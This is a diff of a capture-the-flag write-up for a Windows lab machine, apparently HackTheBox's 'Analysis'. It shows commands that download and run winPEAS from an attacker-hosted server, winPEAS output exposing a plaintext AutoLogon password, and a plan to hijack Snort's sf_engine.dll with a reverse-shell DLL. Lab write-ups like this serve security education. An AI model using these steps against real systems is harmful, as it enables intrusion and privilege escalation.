@@ -655,22 +655,82 @@ Mode                LastWriteTime         Length Name
 -ar---        1/23/2024  10:11 PM             34 user.txt
 
 *Evil-WinRM* PS C:\Users\jdoe\Documents> type ..\Desktop\user.txt
-8848e4efa24ce8385d44f262ba31cba6
+<SNIP>
 ```
 
-> Run `winpeas`.
+## Privilege escalation
 
-As we noticed earlier, **Snort** is used on this machine.
+We can start searching for potential privesc routers using [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20240121-3ce7876d). We can launch a Python HTTP server, download the file from the target and execute it:
 
-> How to check snort's version?
+```bash
+# start an HTTP server
+$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
 
-> [CVE-2016-1417](https://nvd.nist.gov/vuln/detail/CVE-2016-1417)
+```powershell
+# download winpeas executable
+*Evil-WinRM* PS C:\Users\jdoe> wget http://10.10.14.16:8888/winPEASx64.exe -o recon.exe
+# run winpeas
+*Evil-WinRM* PS C:\Users\jdoe>.\recon.exe
 
-> [Snort 2.9.7.0-WIN32 DLL Hijacking](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html)
+<SNIP>
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  analysis.htb.
+    DefaultUserName               :  jdoe
+    DefaultPassword               :  7y4Z4^*y9Zzj
+
+<SNIP>
+
+   =================================================================================================
+
+    Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
+    Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
+   =================================================================================================
+
+<SNIP>
+
+   =================================================================================================
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
+È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+    (ANALYSIS\Administrateur) run_bctextencoder: C:\Users\jdoe\AppData\Local\Automation\run.bat
+    Permissions file: jdoe [AllAccess]
+    Permissions folder(DLL Hijacking): jdoe [AllAccess]
+    Trigger: At log on of ANALYSIS\jdoe
+
+   =================================================================================================
+
+<SNIP>
+```
+
+`winPEAS` was able to find the credentials we already have, and two possible DLL Hijacking vulnerabilities, one related to Snort. After searching for "*DLL hijacking snort*", this page pops up: [Snort 2.9.7.0-WIN32 DLL Hijacking](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html) which is associated with [CVE-2016-1417](https://nvd.nist.gov/vuln/detail/CVE-2016-1417). Among others, this article mentions:
+
+    _`snort.exe` can be exploited to execute arbitrary code on victims system via DLL hijacking, the vulnerable DLL is `tcapi.dll`. If a user opens a `.pcap` file from a remote share using `snort.exe` and the DLL exists in that directory._
+
+    Then goes up and lists some steps:
+    1. create any empty file on a remote dir share with a `.pcap` extension
+    2. place arbitrary DLL named  `tcapi.dll` in remote share
+    3. open with `snort.exe`
+    4. BAM!
+
+In our case `snort` is already up and running:
+
+```powershell
+# getting information about the snort process
+*Evil-WinRM* PS C:\Users\jdoe> Get-Process snort
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    154      16    38560      18784              4912   0 snort
+```
 
 > [DLL Hijacking Practical](https://www.cs.toronto.edu/~arnold/427/16s/csc427_16s/tutorials/DLLHijacking/DLL%20Hijacking%20Practical.pdf)
 
-We can read Snort's configuration:
+Looking at Snort's configuration file, it seems like it uses `sf_engine.dll` (instead of `tcapi.dll`) and picking it up from `C:\Snort\lib\snort_dynamicpreprocessor`:
 
 ```bash
 # reading snort's configuration file
@@ -709,6 +769,15 @@ dynamicengine C:\Snort\lib\snort_dynamicengine\sf_engine.dll
 # path to dynamic rules libraries
 # dynamicdetection directory C:\Snort\lib\snort_dynamicrules
 ```
+
+We can find out if the `snort` process is running with elevated privileges:
+
+```powershell
+*Evil-WinRM* PS C:\Users\jdoe> Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated | findstr snort
+snort                                     True
+```
+
+Next, we can try creating a malicious DLL with the same name, i.e., `sf_engine.dll`, containing reverse shell code, so the `snort` process can pick it up and execute it with elevated privileges:
 
 ```bash
 # creating a malicious DLL
@@ -786,9 +855,7 @@ Microsoft Windows [Version 10.0.17763.5329]
 
 C:\Windows\system32>type c:\users\administrateur\desktop\root.txt
 type c:\users\administrateur\desktop\root.txt
-b8e76f49d5c1cc4a1ffb7e598d9018d4
+<SNIP>
 ```
-
-
 
 ![](machine_pwned.png){: width="75%" .normal}
